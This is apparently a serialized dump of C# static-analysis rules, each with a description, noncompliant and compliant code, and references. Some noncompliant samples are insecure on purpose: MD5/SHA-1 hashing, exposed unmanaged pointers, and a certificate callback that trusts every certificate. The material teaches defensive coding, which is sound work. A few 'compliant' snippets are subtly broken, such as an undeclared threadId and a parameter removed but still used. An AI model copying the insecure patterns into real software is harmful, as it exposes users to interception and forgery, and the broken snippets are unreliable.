  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VwAZAg">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">Recommendation for Block Cipher Modes of Operation</a>
  </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#ECB_MODE">ECB_MODE</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#PADDING_ORACLE">PADDING_ORACLE</a> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=csharpsquid%3AS5542'>S5542</a> instead.</p>ZVULNERABILITY
»
csharpsquid:S3904≤
csharpsquidS3904*Assemblies should have version information"CRITICAL*cs:’<p>If no <code>AssemblyVersionAttribute</code> is provided, the same default version will be used for every build. Since the version number is used by
The .NET Framework to uniquely identify an assembly this can lead to broken dependencies.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Reflection;

[assembly: AssemblyTitle("MyAssembly")] // Noncompliant

namespace MyLibrary
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Reflection;

[assembly: AssemblyTitle("MyAssembly")]
[assembly: AssemblyVersionAttribute("1.2.125.0")]

namespace MyLibrary
{
}
</pre>
<h2>See</h2>
<p><a href="https://msdn.microsoft.com/en-us/library/51ket42z.aspx">Assembly Versioning (MSDN)</a></p>Z
CODE_SMELL
å
csharpsquid:S4487ˆ

csharpsquidS4487)Unread "private" fields should be removed"CRITICAL*cs:ö
<p>Private fields only used to store values without reading them later is a case of dead store. So changing the value of such field is useless and
most probably indicates a serious error in the code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Rectangle
{
  private readonly int length;
  private readonly int width;  // width is written but never read

  public Rectangle(int length, int width)
  {
    this.length = length;
    this.width = width;
  }

  public int Surface
  {
    get
    {
      return length * length;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Rectangle
{
  private readonly int length;
  private readonly int width;

  public Rectangle(int length, int width)
  {
    this.length = length;
    this.width= width;
  }

  public int Surface
  {
    get
    {
      return length * width;
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>Z
CODE_SMELL
⁄
csharpsquid:S4000ƒ
csharpsquidS40002Pointers to unmanaged memory should not be visible"CRITICAL*cs:ﬂ<p>The <code>IntPtr</code> and <code>UIntPtr</code> types are used to access unmanaged memory, usually in order to use C or C++ libraries. If such a
pointer is not secured by making it <code>private</code>, <code>internal</code> or <code>readonly</code>, it can lead to a vulnerability allowing
access to arbitrary locations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  public class MyClass
  {
    public IntPtr myPointer;  // Noncompliant
    protected UIntPtr myOtherPointer; // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
  public class MyClass
  {
    private IntPtr myPointer;
    protected readonly UIntPtr myOtherPointer;
  }
}
</pre>Z
CODE_SMELL
ı
csharpsquid:S3600ﬂ
csharpsquidS3600."params" should not be introduced on overrides"CRITICAL*cs:˛<p>Adding <code>params</code> to a method override has no effect. The compiler accepts it, but the callers won't be able to benefit from the added
modifier.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Base
{
  public virtual void Method(int[] numbers)
  {
    ...
  }
}
class Derived : Base
{
  public override void Method(params int[] numbers) // Noncompliant, method can't be called with params syntax.
  {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Base
{
  public virtual void Method(int[] numbers)
  {
    ...
  }
}
class Derived : Base
{
  public override void Method(int[] numbers)
  {
    ...
  }
}
</pre>Z
CODE_SMELL
Ï
csharpsquid:S4019÷
csharpsquidS4019'Base class methods should not be hidden"CRITICAL*cs:¸<p>When a method in a derived class has the same name as a method in the base class but with a signature that only differs by types that are weakly
derived (e.g. <code>object</code> vs <code>string</code>), the result is that the base method becomes hidden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  class Foo
  {
    internal void SomeMethod(string s1, string s2) { }
  }

  class Bar : Foo
  {
    internal void SomeMethod(string s1, object o2) { }  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
  class Foo
  {
    internal void SomeMethod(string s1, string s2) { }
  }

  class Bar : Foo
  {
    internal void SomeOtherMethod(string s1, object o2) { }
  }
}
</pre>Z
CODE_SMELL
≈
csharpsquid:S1541Ø
csharpsquidS15410Methods and properties should not be too complex"CRITICAL*cs:Ã<p>The cyclomatic complexity of methods and properties should not exceed a defined threshold. Complex code can perform poorly and will in any case be
difficult to understand and therefore to maintain.</p>Z
CODE_SMELL
ì
csharpsquid:S121˛
csharpsquidS121*Control structures should use curly braces"CRITICAL*cs:¢<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// the two statements seems to be attached to the if statement, but that is only true for the first one:
if (condition)
  ExecuteSomething();
  CheckSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition)
{
  ExecuteSomething();
  CheckSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>Z
CODE_SMELL
Ç
csharpsquid:S4015Ï
csharpsquidS40153Inherited member visibility should not be decreased"CRITICAL*cs:Ü<p>Changing an inherited member to <code>private</code> will not prevent access to the base class implementation.</p>
<p>This rule raises an issue when a <code>private</code> method in an unsealed type has a signature that is identical to a <code>public</code> method
declared in a base type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Foo
  {
    public void SomeMethod(int count) { }
  }
  public class Bar:Foo
  {
    private void SomeMethod(int count) { } // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Foo
  {
    public void SomeMethod(int count) { }
  }
  public sealed class Bar : Foo
  {
    private void SomeMethod(int count) { }
  }
}
</pre>Z
CODE_SMELL
™
csharpsquid:S2197î
csharpsquidS21979Modulus results should not be checked for direct equality"CRITICAL*cs:®<p>When the modulus of a negative number is calculated, the result will either be negative or zero. Thus, comparing the modulus of a variable for
equality with a positive number (or a negative one) could result in unexpected results. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public bool IsOdd(int x)
{
  return x % 2 == 1;  // Noncompliant; if x is an odd negative, x % 2 == -1
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public bool IsOdd(int x)
{
  return x %2 != 0;
}
</pre>
<p>or</p>
<pre>
public bool IsOdd(uint x)
{
  return x %2 == 1;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/xAHAAQ">CERT, NUM51-J.</a> - Do not assume that the remainder operator always returns a
  nonnegative result for integral operands </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NQBi">CERT, INT10-C</a> - Do not assume a positive remainder when using the % operator
  </li>
</ul>Z
CODE_SMELL
˝
csharpsquid:S3966Á
csharpsquidS3966-Objects should not be disposed more than once"CRITICAL*cs:á<p>A proper implementation of <code>IDisposable.Dispose</code> should allow for it to be called multiple times on the same object, however this is not
guaranteed and could result in an exception being thrown.</p>
<p>It is best not to rely on this behaviour and therefore make sure an object is disposed only once on all execution paths. This is particularly true
when dealing with nested <code>using</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using (Stream stream = new FileStream("file.txt", FileMode.OpenOrCreate))
{
    using (StreamWriter writer = new StreamWriter(stream))  // Noncompliant: 'stream' will be disposed twice
    {
        // Use the writer object...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Stream stream = null;
try
{
    stream = new FileStream("file.txt", FileMode.OpenOrCreate);
    using (StreamWriter writer = new StreamWriter(stream))
    {
        stream = null;
        // Use the writer object...
    }
}
finally
{
    if(stream != null)
        stream.Dispose();
}
</pre>Z
CODE_SMELL
€
csharpsquid:S2070≈
csharpsquidS2070NSHA-1 and Message-Digest hash algorithms should not be used in secure contexts"CRITICAL*cs:¡<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6.</p>
<p>This rule tracks usage of the <code>System.Security.Cryptography.CryptoConfig.CreateFromName()</code>, and
<code>System.Security.Cryptography.HashAlgorithm.Create()</code> methods to instantiate MD5, DSA, HMACMD5, HMACRIPEMD160, RIPEMD-160 or SHA-1
algorithms, and of derived class instances of <code>System.Security.Cryptography.SHA1</code> and <code>System.Security.Cryptography.MD5</code>.</p>
<p>Consider using safer alternatives, such as SHA-256, or SHA-3.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var hashProvider1 = new MD5CryptoServiceProvider(); //Noncompliant
var hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName("MD5"); //Noncompliant
var hashProvider3 = new SHA1Managed(); //Noncompliant
var hashProvider4 = HashAlgorithm.Create("SHA1"); //Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var hashProvider1 = new SHA256Managed();
var hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName("SHA256Managed");
var hashProvider3 = HashAlgorithm.Create("SHA256Managed");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/328">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="http://shattered.io/">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=csharpsquid%3AS4790'>S4790</a> instead.</p>ZVULNERABILITY
ù
csharpsquid:S1994á
csharpsquidS1994>"for" loop increment clauses should modify the loops' counters"CRITICAL*cs:ñ<p>It can be extremely confusing when a <code>for</code> loop's counter is incremented outside of its increment clause. In such cases, the increment
should be moved to the loop's increment clause if at all possible.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (i = 0; i &lt; 10; j++) // Noncompliant
{
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (i = 0; i &lt; 10; i++)
{
  // ...
}
</pre>Z
CODE_SMELL
ä
csharpsquid:S4586Ù
csharpsquidS45867Non-async "Task/Task<T>" methods should not return null"CRITICAL*cs:ë<p>Returning <code>null</code> from a non-<code>async</code> <code>Task</code>/<code>Task&lt;T&gt;</code> method will cause a
<code>NullReferenceException</code> at runtime. This problem can be avoided by returning <code>Task.FromResult&lt;T&gt;(null)</code> instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Task&lt;object&gt; GetFooAsync()
{
    return null; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public Task&lt;object&gt; GetFooAsync()
{
    return Task.FromResult&lt;object&gt;(null);
}
</pre>ZBUG
â
csharpsquid:S3937Û
csharpsquidS3937!Number patterns should be regular"CRITICAL*cs:ü<p>The use of punctuation characters to separate subgroups in a number can make the number more readable. For instance consider 1,000,000,000 versus
1000000000. But when the grouping is irregular, such as 1,000,00,000; it indicates an error. </p>
<p>This rule raises an issue when underscores (<code>_</code>) are used to break a number into irregular subgroups.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int duos = 1_00_00;
int million = 1_000_00_000;  // Noncompliant
int thousand = 1000;
int tenThousand = 100_00;  // Noncompliant
</pre>Z
CODE_SMELL
Ó
csharpsquid:S4583ÿ
csharpsquidS4583SCalls to delegate's method "BeginInvoke" should be paired with calls to "EndInvoke""CRITICAL*cs:Ÿ<p>Calling the <code>BeginInvoke</code> method of a delegate will allocate some resources that are only freed-up when <code>EndInvoke</code> is
called. This is why you should always pair <code>BeginInvoke</code> with an <code>EndInvoke</code> to complete your asynchronous call.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> the <code>BeginInvoke</code> method is called without any callback and it is not paired with a call to <code>EndInvoke</code> in the same
  block. </li>
  <li> a callback with a single parameter of type <code>IAsyncResult</code> doesn't contain a call to <code>EndInvoke</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>BeginInvoke without callback</p>
<pre>
public delegate string AsyncMethodCaller();

public static void Main()
{
    AsyncExample asyncExample = new AsyncExample();
    AsyncMethodCaller caller = new AsyncMethodCaller(asyncExample.MyMethod);

    // Initiate the asynchronous call.
    IAsyncResult result = caller.BeginInvoke(null, null); // Noncompliant - not paired with EndInvoke
}
</pre>
<p>BeginInvoke with callback</p>
<pre>
public delegate string AsyncMethodCaller();

public static void Main()
{
    AsyncExample asyncExample = new AsyncExample();
    AsyncMethodCaller caller = new AsyncMethodCaller(asyncExample.MyMethod);

    IAsyncResult result = caller.BeginInvoke(
        new AsyncCallback((IAsyncResult ar) =&gt; {}),
        null); // Noncompliant - not paired with EndInvoke
}
</pre>
<h2>Compliant Solution</h2>
<p>BeginInvoke without callback</p>
<pre>
public delegate string AsyncMethodCaller();

public static void Main()
{
    AsyncExample asyncExample = new AsyncExample();
    AsyncMethodCaller caller = new AsyncMethodCaller(asyncExample.MyMethod);

    IAsyncResult result = caller.BeginInvoke(null, null);

    string returnValue = caller.EndInvoke(out threadId, result);
}
</pre>
<p>BeginInvoke with callback</p>
<pre>
public delegate string AsyncMethodCaller();

public static void Main()
{
    AsyncExample asyncExample = new AsyncExample();
    AsyncMethodCaller caller = new AsyncMethodCaller(asyncExample.MyMethod);

    IAsyncResult result = caller.BeginInvoke(
        new AsyncCallback((IAsyncResult ar) =&gt;
            {
                // Retrieve the delegate.
                AsyncResult result = (AsyncResult)ar;
                AsyncMethodCaller caller = (AsyncMethodCaller)result.AsyncDelegate;
                // Call EndInvoke to retrieve the results.
                string returnValue = caller.EndInvoke(ar);
            }),
            null
        );
}
</pre>
<h2>See</h2>
<p><a href="https://docs.microsoft.com/en-us/dotnet/standard/asynchronous-programming-patterns/calling-synchronous-methods-asynchronously">Calling
Synchronous Methods Asynchronously</a></p>ZBUG
∫
csharpsquid:S3265§
csharpsquidS32658Non-flags enums should not be used in bitwise operations"CRITICAL*cs:π<p><code>enum</code>s are usually used to identify distinct elements in a set of values. However <code>enum</code>s can be treated as bit fields and
bitwise operations can be used on them to combine the values. This is a good way of specifying multiple elements of set with a single value. When
<code>enum</code>s are used this way, it is a best practice to mark the <code>enum</code> with the <code>FlagsAttribute</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum Permissions
{
  None = 0,
  Read = 1,
  Write = 2,
  Execute = 4
}
// ...

var x = Permissions.Read | Permissions.Write;  // Noncompliant; enum is not marked with [Flags]
</pre>
<h2>Compliant Solution</h2>
<pre>
[Flags]
enum Permissions
{
  None = 0,
  Read = 1,
  Write = 2,
  Execute = 4
}
// ...

var x = Permissions.Read | Permissions.Write;
</pre>Z
CODE_SMELL
˚
csharpsquid:S2290Â
csharpsquidS2290'Field-like events should not be virtual"CRITICAL*cs:ã<p>Field-like events are events that do not have explicit <code>add</code> and <code>remove</code> methods. The compiler generates a
<code>private</code> <code>delegate</code> field to back the event, as well as generating the implicit <code>add</code> and <code>remove</code>
methods.</p>
<p>When a <code>virtual</code> field-like <code>event</code> is overridden by another field-like <code>event</code>, the behavior of the C# compiler
is to generate a new <code>private</code> <code>delegate</code> field in the derived class, separate from the parent's field. This results in multiple
and separate events being created, which is rarely what's actually intended.</p>
<p>To prevent this, remove the <code>virtual</code> designation from the parent class event.</p>
<h2>Noncompliant Code Example</h2>
<pre>
abstract class Car
{
  public virtual event EventHandler OnRefueled; // Noncompliant

  public void Refuel()
  {
    // This OnRefueld will always be null
     if (OnRefueled != null)
     {
       OnRefueled(this, null);
     }
  }
}

class R2 : Car
{
  public override event EventHandler OnRefueled;
}

class Program
{
  static void Main(string[] args)
  {
    var r2 = new R2();
    r2.OnRefueled += new EventHandler((o, a) =&gt;
    {
      Console.WriteLine("This event will never be called");
    });
    r2.Refuel();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
abstract class Car
{
  public event EventHandler OnRefueled; // Compliant

  public void Refuel()
  {
    if (OnRefueled != null)
    {
      OnRefueled(this, null);
    }
  }
}

class R2 : Car {}

class Program
{
  static void Main(string[] args)
  {
    var r2 = new R2();
    r2.OnRefueled += new EventHandler((o, a) =&gt;
    {
      Console.WriteLine("This event will be called");
    });
    r2.Refuel();
  }
}
</pre>Z
CODE_SMELL
¿

csharpsquid:S2291™

csharpsquidS2291=Overflow checking should not be disabled for "Enumerable.Sum""CRITICAL*cs:∫	<p><code>Enumerable.Sum()</code> always executes addition in a <code>checked</code> context, so an <code>OverflowException</code> will be thrown if
the value exceeds <code>MaxValue</code> even if an <code>unchecked</code> context was specified. Using an <code>unchecked</code> context anyway
represents a misunderstanding of how <code>Sum</code> works.</p>
<p>This rule raises an issue when an <code>unchecked</code> context is specified for a <code>Sum</code> on integer types.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void Add(List&lt;int&gt; list)
{
  int d = unchecked(list.Sum());  // Noncompliant

  unchecked
  {
    int e = list.Sum();  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void Add(List&lt;int&gt; list)
{
  int d = list.Sum();

  try
  {
    int e = list.Sum();
  }
  catch (System.OverflowException e)
  {
    // exception handling...
  }
}
</pre>
<h2>Exceptions</h2>
<p>When the <code>Sum()</code> call is inside a <code>try-catch</code> block, no issues are reported.</p>
<pre>
void Add(List&lt;int&gt; list)
{
  unchecked
  {
    try
    {
      int e = list.Sum();
    }
    catch (System.OverflowException e)
    {
      // exception handling...
    }
  }
}
</pre>Z
CODE_SMELL
´
csharpsquid:S2302ï
csharpsquidS2302"nameof" should be used"CRITICAL*cs:À
<p>Because parameter names could be changed during refactoring, they should not be spelled out literally in strings. Instead, use
<code>nameof()</code>, and the string that's output will always be correct.</p>
<p>This rule raises an issue when a string in the <code>throw</code> statement contains the name of one of the method parameters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void DoSomething(int someParameter, string anotherParam)
{
    if (someParameter &lt; 0)
    {
        throw new ArgumentException("Bad argument", "someParameter");  // Noncompliant
    }
    if (anotherParam == null)
    {
        throw new Exception("anotherParam should not be null"); // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void DoSomething(int someParameter)
{
    if (someParameter &lt; 0)
    {
        throw new ArgumentException("Bad argument", nameof(someParameter));
    }
    if (anotherParam == null)
    {
        throw new Exception($"{nameof(anotherParam)} should not be null");
    }
}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> The rule doesn't raise any issue when using C# &lt; 6.0. </li>
  <li> When the parameter name is contained in a sentence inside the <code>throw</code> statement string, the rule will raise an issue only if the
  parameter name is at least 5 characters long. This is to avoid false positives. </li>
</ul>Z
CODE_SMELL
ä
csharpsquid:S3874Ù
csharpsquidS3874-"out" and "ref" parameters should not be used"CRITICAL*cs:î<p>Passing a parameter by reference, which is what happens when you use the <code>out</code> or <code>ref</code> parameter modifiers, means that the
method will receive a pointer to the argument, rather than the argument itself. If the argument was a value type, the method will be able to change
the argument's values. If it was a reference type, then the method receives a pointer to a pointer, which is usually not what was intended. Even when
it is what was intended, this is the sort of thing that's difficult to get right, and should be used with caution.</p>
<p>This rule raises an issue when <code>out</code> or <code>ref</code> is used on a non-<code>Optional</code> parameter in a public method.
<code>Optional</code> parameters are covered by S3447.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void GetReply(
         ref MyClass input, // Noncompliant
         out string reply)  // Noncompliant
{ ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
public string GetReply(MyClass input)
{ ... }

public bool TryGetReply(MyClass input, out string reply)
{ ... }

public ReplyData GetReply(MyClass input)
{ ... }

internal void GetReply(ref MyClass input, out string reply)
{ ... }
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise issues for:</p>
<p>- non-public methods</p>
<p>- methods with only 'out' parameters, name starting with "Try" and return type bool.</p>
<p>- interface implementation methods</p>Z
CODE_SMELL
ó	
csharpsquid:S3871Å	
csharpsquidS3871"Exception types should be "public""CRITICAL*cs:¨<p>The point of having custom exception types is to convey more information than is available in standard types. But custom exception types must be
<code>public</code> for that to work. </p>
<p>If a method throws a non-public exception, the best you can do on the caller's side is to <code>catch</code> the closest <code>public</code> base
of the class. That is, you lose all that custom information you created the exception type to pass. </p>
<h2>Noncompliant Code Example</h2>
<pre>
internal class MyException : Exception   // Noncompliant
{
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyException : Exception
{
  // ...
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores Exception types that are not derived directly from <code>System.Exception</code>, <code>System.SystemException</code>, or
<code>System.ApplicationException</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A10-Insufficient_Logging%26Monitoring">OWASP Top 10 2017 Category A10</a> - Insufficient
  Logging &amp; Monitoring </li>
</ul>Z
CODE_SMELL
„
csharpsquid:S1215Õ
csharpsquidS1215!"GC.Collect" should not be called"CRITICAL*cs:˘<p>Calling <code>GC.Collect</code> is rarely necessary, and can significantly affect application performance. That's because it triggers a blocking
operation that examines <em>every object in memory</em> for cleanup. Further, you don't have control over when this blocking cleanup will actually
run.</p>
<p>As a general rule, the consequences of calling this method far outweigh the benefits unless perhaps you've just triggered some event that is unique
in the run of your program that caused a lot of long-lived objects to die.</p>
<p>This rule raises an issue when <code>GC.Collect</code> is invoked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
static void Main(string[] args)
{
  // ...
  GC.Collect(2, GCCollectionMode.Optimized); // Noncompliant
}
</pre>Z
CODE_SMELL
à

csharpsquid:S3998Ú	
csharpsquidS39985Threads should not lock on objects with weak identity"CRITICAL*cs:ä	<p>A thread acquiring a lock on an object that can be accessed across application domain boundaries runs the risk of being blocked by another thread
in a different application domain. Objects that can be accessed across application domain boundaries are said to have weak identity. Types with weak
identity are:</p>
<ul>
  <li> <code>MarshalByRefObject</code> </li>
  <li> <code>ExecutionEngineException</code> </li>
  <li> <code>OutOfMemoryException</code> </li>
  <li> <code>StackOverflowException</code> </li>
  <li> <code>String</code> </li>
  <li> <code>MemberInfo</code> </li>
  <li> <code>ParameterInfo</code> </li>
  <li> <code>Thread</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Threading;

namespace MyLibrary
{
  class Foo
  {
    string myString = "foo";

    void Bar()
    {
      lock(myString) { } // Noncompliant
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Threading;

namespace MyLibrary
{
  class Foo
  {
    string myString = "foo";
    private readonly Object thisLock = new Object();

    void Bar()
    {
      lock(thisLock) { } // Compliant
    }
  }
}
</pre>Z
CODE_SMELL
Í
csharpsquid:S1699‘
csharpsquidS16995Constructors should only call non-overridable methods"CRITICAL*cs:Ï<p>Calling an overridable method from a constructor could result in failures or strange behaviors when instantiating a subclass which overrides the
method.</p>
<p>For example:</p>
<ul>
  <li> The subclass class constructor starts by calling the parent class constructor. </li>
  <li> The parent class constructor calls the method, which has been overridden in the child class. </li>
  <li> If the behavior of the child class method depends on fields that are initialized in the child class constructor, unexpected behavior (like a
  <code>NullReferenceException</code>) can result, because the fields aren't initialized yet. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent
{
  public Parent()
  {
    DoSomething();  // Noncompliant
  }

  public virtual void DoSomething() // can be overridden
  {
    ...
  }
}

public class Child : Parent
{
  private string foo;

  public Child(string foo) // leads to call DoSomething() in Parent constructor which triggers a NullReferenceException as foo has not yet been initialized
  {
    this.foo = foo;
  }

  public override void DoSomething()
  {
    Console.WriteLine(this.foo.Length);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/MYYbAQ">CERT, MET05-J.</a> - Ensure that constructors do not call overridable methods
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/TQBi">CERT, OOP50-CPP.</a> - Do not invoke virtual functions from constructors or
  destructors </li>
</ul>Z
CODE_SMELL
˝
csharpsquid:S2551Á
csharpsquidS2551/Shared resources should not be used for locking"CRITICAL*cs:å<p>Shared resources should not be used for locking as it increases the chance of deadlocks. Any other thread could acquire (or attempt to acquire) the
same lock for another unrelated purpose. </p>
<p>Instead, a dedicated <code>object</code> instance should be used for each shared resource, to avoid deadlocks or lock contention.</p>
<p>The following objects are considered as shared resources:</p>
<ul>
  <li> <code>this</code> </li>
  <li> a <code>Type</code> object </li>
  <li> a string literal </li>
  <li> a string instance </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void MyLockingMethod()
{
    lock (this) // Noncompliant
    {
        // ...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private readonly object lockObj = new object();

public void MyLockingMethod()
{
    lock (lockObj)
    {
        // ...
    }
}
</pre>
<h2>See</h2>
<p><a href="https://docs.microsoft.com/en-us/dotnet/standard/threading/managed-threading-best-practices">Microsoft Documentation: Managed Threading
Best Practices</a></p>ZBUG
§
csharpsquid:S3972é
csharpsquidS3972&Conditionals should start on new lines"CRITICAL*cs:µ<p>Code is clearest when each statement has its own line. Nonetheless, it is a common pattern to combine on the same line an <code>if</code> and its
resulting <em>then</em> statement. However, when an <code>if</code> is placed on the same line as the closing <code>}</code> from a preceding
<em>then</em>, <em>else</em> or <em>else if</em> part, it is either an error - <code>else</code> is missing - or the invitation to a future error as
maintainers fail to understand that the two statements are unconnected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  // ...
} if (condition2) {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1) {
  // ...
} else if (condition2) {
  //...
}
</pre>
<p>Or</p>
<pre>
if (condition1) {
  // ...
}

if (condition2) {
  //...
}
</pre>Z
CODE_SMELL
√
csharpsquid:S3973≠
csharpsquidS3973EA conditionally executed single line should be denoted by indentation"CRITICAL*cs:µ<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention
and good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely
unclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
DoTheThing();

DoTheOtherThing();
SomethingElseEntirely();

Foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition)
  DoTheThing();

DoTheOtherThing();
SomethingElseEntirely();

Foo();
</pre>Z
CODE_SMELL
ú
csharpsquid:S4025Ü
csharpsquidS4025TChild class fields should not differ from parent class fields only by capitalization"CRITICAL*cs:ˇ<p>Having a field in a child class with a name that differs from a parent class' field only by capitalization is sure to cause confusion. Such child
class fields should be renamed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit
{
  protected string plantingSeason;
  //...
}

public class Raspberry : Fruit
{
  protected string plantingseason;  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit
{
  protected string plantingSeason;
  //...
}

public class Raspberry : Fruit
{
  protected string whenToPlant;
  // ...
}
</pre>
<p>Or</p>
<pre>
public class Fruit
{
  protected string plantingSeason;
  //...
}

public class Raspberry : Fruit
{
  // field removed; parent field will be used instead
  // ...
}
</pre>Z
CODE_SMELL
«
csharpsquid:S4830±
csharpsquidS4830AServer certificates should be verified during SSL/TLS connections"CRITICAL*cs:∫<p>Validation of X.509 certificates is essential to create secure SSL/TLS sessions not vulnerable to man-in-the-middle attacks. </p>
<p>The certificate chain validation includes these steps:</p>
<ul>
  <li> The certificate is issued by its parent Certificate Authority or the root CA trusted by the system. </li>
  <li> Each CA is allowed to issue certificates. </li>
  <li> Each certificate in the chain is not expired. </li>
</ul>
<p>It's not recommended to reinvent the wheel by implementing custom certificate chain validation.</p>
<p>TLS libraries provide built-in certificate validation functions that should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ServicePointManager.ServerCertificateValidationCallback +=
    (sender, certificate, chain, errors) =&gt; {
        return true; // Noncompliant: trust all certificates
    };
</pre>
<h2>Compliant Solution</h2>
<pre>
ServicePointManager.ServerCertificateValidationCallback +=
    (sender, certificate, chain, errors) =&gt;
    {
        if (development) return true; // for development, trust all certificates
        return errors == SslPolicyErrors.None
            &amp;&amp; validCerts.Contains(certificate.GetCertHashString()); // Compliant: trust only some certificates
    };
</pre>
